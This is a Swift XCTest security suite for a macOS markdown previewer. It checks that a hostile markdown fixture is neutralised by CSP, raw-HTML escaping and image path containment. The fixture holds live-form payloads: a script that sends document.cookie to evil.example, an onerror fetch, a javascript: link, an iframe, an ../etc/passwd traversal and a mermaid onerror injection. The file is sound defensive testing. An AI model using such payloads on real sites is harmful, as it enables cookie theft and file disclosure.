import XCTest
import JavaScriptCore
@testable import MacMD

/// The untrusted-markdown security gate (a release gate). A single hostile
/// document exercises every attack vector the render pipeline must neutralize.
/// M1 covers every Swift-side guarantee: the CSP value, markdown-it raw-HTML
/// escaping, and image path containment. Two fixture vectors are completed and
/// re-run through this same suite later: the `javascript:` link's navigation
/// block lands with the WKNavigationDelegate in M2 (PreviewWebView), and the live
/// zero-network-egress proof (WKContentRuleList plus a proxy) is the M2 and
/// pre-release macos-app-testing gate. Mermaid injection is added in M4.
final class HostileFixtureTests: XCTestCase {

    /// A document carrying a script tag, an onerror handler, a javascript: link,
    /// a remote image, an iframe, an image path traversal, and a legit image.
    static let hostileFixture = """
    # Title
    <script>fetch('https://evil.example/'+document.cookie)</script>
    <img src=x onerror="fetch('https://evil.example')">
    [click me](javascript:alert(1))
    ![remote](https://evil.example/tracker.png)
    <iframe src="https://evil.example"></iframe>
    ![escape](../../../etc/passwd)
    ![ok](local.png)

    ```mermaid
    flowchart TD
      A["<img src=x onerror='window.__pwned=true'>"]
      A-->B
    ```
    """

    private func directive(_ name: String, in csp: String) -> String? {
        csp.split(separator: ";")
            .map { $0.trimmingCharacters(in: .whitespaces) }
            .first { $0 == name || $0.hasPrefix(name + " ") }
    }

    func testCSPNeutralizesScriptInlineHandlerAndJSURL() {
        let csp = MarkdownRenderEngine.cspHeaderValue(nonce: "N")
        let scriptSrc = directive("script-src", in: csp)
        XCTAssertNotNil(scriptSrc)
        XCTAssertTrue(scriptSrc?.contains("'nonce-N'") ?? false)
        // No inline-script or eval execution: the inline <script>, the onerror
        // handler, and the javascript: URL are all denied.
        XCTAssertEqual(scriptSrc?.contains("'unsafe-inline'"), false)
        XCTAssertEqual(scriptSrc?.contains("'unsafe-eval'"), false)
    }

    func testCSPBlocksRemoteImageIframeAndNetwork() {
        let csp = MarkdownRenderEngine.cspHeaderValue(nonce: "N")
        XCTAssertEqual(directive("img-src", in: csp), "img-src macmd-resource: data:")
        XCTAssertEqual(directive("frame-src", in: csp), "frame-src 'none'")
        XCTAssertEqual(directive("connect-src", in: csp), "connect-src 'none'")
    }

    func testMarkdownItEscapesRawHTML() {
        guard let url = Bundle.main.url(forResource: "markdown-it.min", withExtension: "js"),
              let js = try? String(contentsOf: url, encoding: .utf8) else {
            return XCTFail("markdown-it.min.js missing from bundle")
        }
        let ctx = JSContext()!
        ctx.evaluateScript("var globalThis = this; var self = this;")
        ctx.evaluateScript(js)
        ctx.setObject(Self.hostileFixture, forKeyedSubscript: "__fixture" as NSString)
        let rendered = ctx.evaluateScript("markdownit({html:false}).render(__fixture)")?.toString() ?? ""

        // Raw HTML is rendered as inert, escaped text, never live tags.
        XCTAssertTrue(rendered.contains("&lt;script&gt;"))
        XCTAssertTrue(rendered.contains("&lt;iframe"))
        XCTAssertFalse(rendered.contains("<script>"))
        XCTAssertFalse(rendered.contains("<iframe"))
    }

    func testTraversalImageIsRejected() throws {
        let fm = FileManager.default
        let tempDir = fm.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try fm.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: tempDir) }
        try Data("png".utf8).write(to: tempDir.appendingPathComponent("local.png"))

        let handler = MarkdownSchemeHandler()
        handler.documentDirectory = tempDir
        XCTAssertNil(handler.imageURL(forToken: "../../../etc/passwd"))
        XCTAssertNotNil(handler.imageURL(forToken: "local.png"))
    }

    /// The hostile document (now carrying a mermaid block with an injection label)
    /// renders its legitimate flowchart while the injection never executes and no
    /// script-src (eval/execution) violation fires. The blocked remote image
    /// legitimately triggers an img-src violation (the CSP doing its job), so this
    /// asserts specifically on script-src, not on zero violations.
    @MainActor
    func testHostileDocumentRendersMermaidWhileBlockingInjection() async {
        let h = PreviewHarness()
        await h.load()
        await h.eval("window.__cspViolations = []; window.__pwned = false; document.addEventListener('securitypolicyviolation', function(e){ window.__cspViolations.push(e.violatedDirective); });")
        await h.renderAndWait(Self.hostileFixture)

        let svg = (await h.eval("document.querySelectorAll('svg').length") as? NSNumber)?.intValue ?? 0
        XCTAssertGreaterThanOrEqual(svg, 1, "the mermaid flowchart renders inside the hostile document")
        let pwned = (await h.eval("window.__pwned === true") as? NSNumber)?.boolValue ?? false
        XCTAssertFalse(pwned, "the injected onerror / click binding did not execute")
        let scriptViolations = (await h.eval("window.__cspViolations.filter(function(v){return v.indexOf('script') >= 0;}).length") as? NSNumber)?.intValue ?? -1
        XCTAssertEqual(scriptViolations, 0, "no script-src (eval/execution) violation with the mermaid block present")
    }
}
